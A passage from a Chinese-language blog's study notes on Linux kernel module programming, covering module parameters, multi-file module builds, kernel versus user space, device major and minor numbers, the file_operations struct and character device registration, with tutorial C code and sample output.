class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  You can use strings, like this:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Get rid of taint message by declaring code as GPL. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Or with defines, like this:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_AUTHOR(DRIVER_AUTHOR);	<span class="comment">/* Who wrote this module? */</span></span><br><span class="line">MODULE_DESCRIPTION(DRIVER_DESC);	<span class="comment">/* What does this module do */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  This module uses /dev/testdevice.  The MODULE_SUPPORTED_DEVICE macro might</span></span><br><span class="line"><span class="comment"> *  be used in the future to help automatic configuration of modules, but is </span></span><br><span class="line"><span class="comment"> *  currently unused other than for documentation purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_SUPPORTED_DEVICE(<span class="string">&quot;testdevice&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-6-向内核模块传递命令行参数"><a href="#2-6-向内核模块传递命令行参数" class="headerlink" title="2.6 向内核模块传递命令行参数"></a>2.6 向内核模块传递命令行参数</h3><p>需要将要传入参数的变量声明为全局变量，并且使用module_param()宏定义。运行时，insmod会将命令行参数传入。<code>./insmod mymodule.ko myvariable=5**</code></p>
<p>module_param()宏接受3个参数：变量名，类型，对应文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> myint = <span class="number">3</span>;</span><br><span class="line">module_param(myint, <span class="type">int</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>数组变量格式稍有不同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> myintarray[<span class="number">2</span>];</span><br><span class="line">module_param_array(myintarray, <span class="type">int</span>, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">/* not interested in count */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> myshortarray[<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line">module_parm_array(myshortarray, <span class="type">short</span>, , <span class="number">0</span>); <span class="comment">/* put count into &quot;count&quot; variable */</span></span><br></pre></td></tr></table></figure>

<p><code>MODULE_PARM_DESC()</code>记录模块接受的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  hello-5.c - Demonstrates command line argument passing to a module.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Peter Jay Salzman&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">short</span> <span class="type">int</span> myshort = <span class="number">1</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myint = <span class="number">420</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="type">int</span> mylong = <span class="number">9999</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *mystring = <span class="string">&quot;blah&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myintArray[<span class="number">2</span>] = &#123; <span class="number">-1</span>, <span class="number">-1</span> &#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> arr_argc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * module_param(foo, int, 0000)</span></span><br><span class="line"><span class="comment"> * The first param is the parameters name</span></span><br><span class="line"><span class="comment"> * The second param is it&#x27;s data type</span></span><br><span class="line"><span class="comment"> * The final argument is the permissions bits, </span></span><br><span class="line"><span class="comment"> * for exposing parameters in sysfs (if non-zero) at a later stage.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">module_param(myshort, <span class="type">short</span>, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);</span><br><span class="line">MODULE_PARM_DESC(myshort, <span class="string">&quot;A short integer&quot;</span>);</span><br><span class="line">module_param(myint, <span class="type">int</span>, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);</span><br><span class="line">MODULE_PARM_DESC(myint, <span class="string">&quot;An integer&quot;</span>);</span><br><span class="line">module_param(mylong, <span class="type">long</span>, S_IRUSR);</span><br><span class="line">MODULE_PARM_DESC(mylong, <span class="string">&quot;A long integer&quot;</span>);</span><br><span class="line">module_param(mystring, charp, <span class="number">0000</span>);</span><br><span class="line">MODULE_PARM_DESC(mystring, <span class="string">&quot;A character string&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * module_param_array(name, type, num, perm);</span></span><br><span class="line"><span class="comment"> * The first param is the parameter&#x27;s (in this case the array&#x27;s) name</span></span><br><span class="line"><span class="comment"> * The second param is the data type of the elements of the array</span></span><br><span class="line"><span class="comment"> * The third argument is a pointer to the variable that will store the number </span></span><br><span class="line"><span class="comment"> * of elements of the array initialized by the user at module loading time</span></span><br><span class="line"><span class="comment"> * The fourth argument is the permission bits</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">module_param_array(myintArray, <span class="type">int</span>, &amp;arr_argc, <span class="number">0000</span>);</span><br><span class="line">MODULE_PARM_DESC(myintArray, <span class="string">&quot;An array of integers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_5_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 5\n=============\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;myshort is a short integer: %hd\n&quot;</span>, myshort);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;myint is an integer: %d\n&quot;</span>, myint);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;mylong is a long integer: %ld\n&quot;</span>, mylong);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;mystring is a string: %s\n&quot;</span>, mystring);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span> myintArray / <span class="keyword">sizeof</span> (<span class="type">int</span>)); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;myintArray[%d] = %d\n&quot;</span>, i, myintArray[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;got %d arguments for myintArray.\n&quot;</span>, arr_argc);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_5_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 5\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_5_init);</span><br><span class="line">module_exit(hello_5_exit);</span><br></pre></td></tr></table></figure>

<p>编译生成的模块<code>hello_5</code>基本信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modinfo hello-5.ko</span><br><span class="line">filename:       /home/bronya/Documents/LKM/writeup/code/hello-5.ko</span><br><span class="line">author:         Peter Jay Salzman</span><br><span class="line">license:        GPL</span><br><span class="line">srcversion:     A704327C32F7F311666C13C</span><br><span class="line">depends:        </span><br><span class="line">retpoline:      Y</span><br><span class="line">name:           hello_5</span><br><span class="line">vermagic:       6.2.0-37-generic SMP preempt mod_unload modversions </span><br><span class="line">parm:           myshort:A short integer (short)</span><br><span class="line">parm:           myint:An integer (int)</span><br><span class="line">parm:           mylong:A long integer (long)</span><br><span class="line">parm:           mystring:A character string (charp)</span><br><span class="line">parm:           myintArray:An array of integers (array of int)</span><br></pre></td></tr></table></figure>

<p>加载模块显示信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ 4659.140006] hello_5: unknown parameter &#x27;mybyte&#x27; ignored</span><br><span class="line">[ 4659.140047] Hello, world 5</span><br><span class="line">               =============</span><br><span class="line">[ 4659.140048] myshort is a short integer: 1</span><br><span class="line">[ 4659.140049] myint is an integer: 420</span><br><span class="line">[ 4659.140049] mylong is a long integer: 9999</span><br><span class="line">[ 4659.140050] mystring is a string: bebop</span><br><span class="line">[ 4659.140050] myintArray[0] = -1</span><br><span class="line">[ 4659.140051] myintArray[1] = -1</span><br><span class="line">[ 4659.140051] got 1 arguments for myintArray.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-7-多文件编译模块"><a href="#2-7-多文件编译模块" class="headerlink" title="2.7 多文件编译模块"></a>2.7 多文件编译模块</h3><p>可以将内核模块分为多个源文件</p>
<p>例：一个模块分为start，stop，将入口函数和退出函数分离</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  start.c - Illustration of multi filed modules</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world - this is the kernel speaking\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  stop.c - Illustration of multi filed modules</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Short is the life of a kernel module\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>Makefile</code>：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += hello-1.o</span><br><span class="line">obj-m += hello-2.o</span><br><span class="line">obj-m += hello-3.o</span><br><span class="line">obj-m += hello-4.o</span><br><span class="line">obj-m += hello-5.o</span><br><span class="line">obj-m += startstop.o</span><br><span class="line">startstop-objs := start.o stop.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(<span class="built_in">shell</span> pwd)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(<span class="built_in">shell</span> pwd)</span> clean</span><br></pre></td></tr></table></figure>

<h3 id="2-8-重新编译内核"><a href="#2-8-重新编译内核" class="headerlink" title="2.8 重新编译内核"></a>2.8 重新编译内核</h3><p>有利于版本的匹配以及内核模块的动态装载以及强制卸载。此处不再详细描述。想了解的读者可以参考原文（<a href="https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN380%EF%BC%89">https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN380）</a></p>
<h2 id="Chapter-3-初步知识"><a href="#Chapter-3-初步知识" class="headerlink" title="Chapter 3 初步知识"></a>Chapter 3 初步知识</h2><h3 id="3-1-模块与程序"><a href="#3-1-模块与程序" class="headerlink" title="3.1 模块与程序"></a>3.1 模块与程序</h3><h4 id="3-1-1-模块如何开始与结束"><a href="#3-1-1-模块如何开始与结束" class="headerlink" title="3.1.1 模块如何开始与结束"></a>3.1.1 模块如何开始与结束</h4><ul>
<li>程序通常使用main()函数作为入口函数，在执行完所有指令后退出。</li>
<li>内核模块使用module__init指定入口函数。初始化操作向内核提供了模块的函数，当内核需要调用模块函数时才会真正执行模块中代码；模块结束使用module_exit，是init操作的反向操作。</li>
</ul>
<h4 id="3-1-2-模块可以调用的函数"><a href="#3-1-2-模块可以调用的函数" class="headerlink" title="3.1.2  模块可以调用的函数"></a>3.1.2  模块可以调用的函数</h4><p>程序可以调用标准C语言库，例如<code>printf()</code>。</p>
<p>内核模块只能调用内核实现的函数，因为模块的目标文件的符号由insmod解析。符号的定义来自于内核本身，导致能够调用的函数只能是由内核提供的，即系统调用（write，ioctl，read）。内核到处的符号可以参见<code>/proc/kallsyms</code>。</p>
<p>库函数运行在用户空间，向开发者提供了系统调用更方便的接口（库函数仍然需要调用系统调用实现）。系统调用运行在内核态。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>gcc -Wall -o test test.c</code>编译，<code>strace ./hello</code>可以看到输出最后有<code>write(1, &quot;hello&quot;, 5hello)</code>为printf使用的系统调用。</p>
<p><code>man 2 write</code>：查看write函数的使用说明，2代表系统调用（kill(), read()）；3代表库函数</p>
<p>可以使用模块来替代内核的系统调用，基于此可以实现插入后门或木马等操作。</p>
<h4 id="3-1-3-用户空间与内核空间"><a href="#3-1-3-用户空间与内核空间" class="headerlink" title="3.1.3 用户空间与内核空间"></a>3.1.3 用户空间与内核空间</h4><p>内核态与用户态的转换</p>
<h4 id="3-1-4-命名空间"><a href="#3-1-4-命名空间" class="headerlink" title="3.1.4 命名空间"></a>3.1.4 命名空间</h4><p>开发者自己开发的变量名不能与其他开发者的冲突，因此会有命名空间来避免（C++有<code>std::</code>，C里这里只提到了要多注意，应该是没有）</p>
<p>当写内核模块时，由于内核模块会被加载到整个内核，因此更需要进行命名管理。最好的方式是将所有变量声明为static且使用合适的前缀命名变量。习惯上，Linux内核变量名一般为小写形式。（还可以定义一个符号表，后面会提到）</p>
<h4 id="3-1-5-代码空间"><a href="#3-1-5-代码空间" class="headerlink" title="3.1.5 代码空间"></a>3.1.5 代码空间</h4><p>内存管理是十分复杂的问题。这里只探究写内核模块需要考虑的问题</p>
<p>每开启一个新进程，内核会为其分配一个真实的物理内存，内存在进程看来为虚拟内存，从0x00000000开始，不同进程的内存地址（0xbffff978）对应的实际地址并不相同。每个进程的虚拟内存与实际内存之间存在着特定偏移。且不同进程无法访问其他进程的内存地址。</p>
<p>内核也有自己的代码空间。由于内核模块是加载到内核中使用，其会与内核共享代码空间。因此如果内核模块内存错误，内核也会出现内存错误。</p>
<p>以上为针对宏内核操作系统，微内核操作系统每个模块有独立的代码空间（GNU Hurd， QNX Neutrino）。</p>
<h4 id="3-1-6-Device-Drivers"><a href="#3-1-6-Device-Drivers" class="headerlink" title="3.1.6 Device Drivers"></a>3.1.6 Device Drivers</h4><p>一类模块是设备驱动程序，为硬件提供功能。在unix系统中，每一个硬件都由&#x2F;dev中的文件表示。设备驱动程序可以代表用户程序与硬件进行通信。例如es1370.o声卡驱动程序可以将&#x2F;dev&#x2F;sound连接到Ensoniq IS1370声卡。用户空间的程序可以直接使用&#x2F;dev&#x2F;sound不需要考虑声卡类型。</p>
<h5 id="3-1-6-1-Major-and-Minor-Numbers"><a href="#3-1-6-1-Major-and-Minor-Numbers" class="headerlink" title="3.1.6.1 Major and Minor Numbers"></a>3.1.6.1 Major and Minor Numbers</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ls -l /dev/sda[1-3]</span><br><span class="line">brw-rw---- 1 root disk 8, 1  1月  5 09:11 /dev/sda1</span><br><span class="line">brw-rw---- 1 root disk 8, 2  1月  5 09:11 /dev/sda2</span><br><span class="line">brw-rw---- 1 root disk 8, 3  1月  5 09:11 /dev/sda3</span><br></pre></td></tr></table></figure>

<p>上图表示了硬盘的前三个分区，其中由逗号分隔的数字前面的为Major Number，后面为Minor Number。Major Number表示哪一个设备驱动访问该硬件，每一个设备驱动都有特定的major number。</p>
<p>Minor Number用来分别同一驱动控制的不同设备。</p>
<p>设备分为两类：字符设备和块设备。块设备有一个缓冲区存放请求（可以对请求进行排序）存储设备；字符设备则没有缓冲区。可以通过查看ls -l中第一个字符为’b’还是’c’来分辨。</p>
<p>可以通过查阅<code>/usr/src/linux/Documentation/devices.txt</code>来了解major number对应的设备</p>
<h2 id="Chapter-4-字符设备文件"><a href="#Chapter-4-字符设备文件" class="headerlink" title="Chapter 4 字符设备文件"></a>Chapter 4 字符设备文件</h2><h3 id="4-1-字符设备驱动程序"><a href="#4-1-字符设备驱动程序" class="headerlink" title="4.1 字符设备驱动程序"></a>4.1 字符设备驱动程序</h3><h4 id="4-1-1-file-operations-结构体"><a href="#4-1-1-file-operations-结构体" class="headerlink" title="4.1.1 file_operations 结构体"></a>4.1.1 file_operations 结构体</h4><p>提供了设备驱动程序对设备的多种操作函数的地址，操作函数定义在内核模块中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	 <span class="type">loff_t</span>(*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">	 <span class="type">ssize_t</span>(*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*aio_read) (<span class="keyword">struct</span> kiocb *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span>);</span><br><span class="line">	 <span class="type">ssize_t</span>(*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*aio_write) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>,</span><br><span class="line">			      <span class="type">loff_t</span>);</span><br><span class="line">	<span class="type">int</span> (*readdir) (<span class="keyword">struct</span> file *, <span class="type">void</span> *, <span class="type">filldir_t</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">	<span class="type">int</span> (*ioctl) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>,</span><br><span class="line">		      <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">	<span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dentry *, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*aio_fsync) (<span class="keyword">struct</span> kiocb *, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*readv) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>,</span><br><span class="line">			  <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*writev) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>,</span><br><span class="line">			   <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*sendfile) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">read_actor_t</span>,</span><br><span class="line">			     <span class="type">void</span> __user *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>,</span><br><span class="line">			     <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>改进</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc extension</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	read: device_read,</span><br><span class="line">	write: device_write,</span><br><span class="line">	open: device_open,</span><br><span class="line">	release: device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C99 way</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	.read = device_read,</span><br><span class="line">	.write = device_write,</span><br><span class="line">	.open = device_open,</span><br><span class="line">	.release = device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="4-1-2-file结构体"><a href="#4-1-2-file结构体" class="headerlink" title="4.1.2 file结构体"></a>4.1.2 file结构体</h4><p>每个设备在内核中由file结构体表示。该结构是内核水平的结构体，不会再用户空间出现。与glibc定义的FILE结构体不同。另外，其代表的是抽象的打开file，而不是硬盘上的file文件（使用inode结构体表示）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * f_&#123;lock,count,pos_lock&#125; members can be highly contended and share</span></span><br><span class="line"><span class="comment"> * the same cacheline. f_&#123;lock,mode&#125; are very frequently used together</span></span><br><span class="line"><span class="comment"> * and so share the same cacheline as well. The read-mostly</span></span><br><span class="line"><span class="comment"> * f_&#123;path,inode,op&#125; are kept on a separate cacheline.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">f_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">f_rcuhead</span>;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> 		f_iocb_flags;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		f_flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="4-1-3-Registering-A-Device"><a href="#4-1-3-Registering-A-Device" class="headerlink" title="4.1.3 Registering A Device"></a>4.1.3 Registering A Device</h4><p>添加一个驱动需要向内核进行注册。该操作会向其分配一个major number（没有minor number因为其只与驱动有关，与内核无关）。使用<code>register_chrdev</code>函数 (<code>linux/fs.h</code>) 进行注册</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">register_chrdev</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> major, <span class="type">const</span> <span class="type">char</span> *name, <span class="keyword">struct</span> file_operations *fops)</span>;</span><br><span class="line"><span class="comment">// 返回值为负表明注册失败</span></span><br></pre></td></tr></table></figure>

<p><code>unsigned int major</code>: 请求的major number</p>
<p><code>char *name</code>: 设备驱动的名字，会保存在<code>/proc/devices</code>中。</p>
<p><code>struct file_operations *fops</code>： 是<code>file_operations</code>表的指针</p>
<p>注：为了保证请求的<code>major number</code>不与已有的设备驱动冲突，可以 1）查看<code>/Documentation/devices.txt</code>；2）传入<code>major number</code> 0.会返回动态分配的<code>major number</code>。缺点是不能提前新建驱动文件。可以手动创建或构造脚本，或者使用<code>mknod</code>命令自动创建</p>
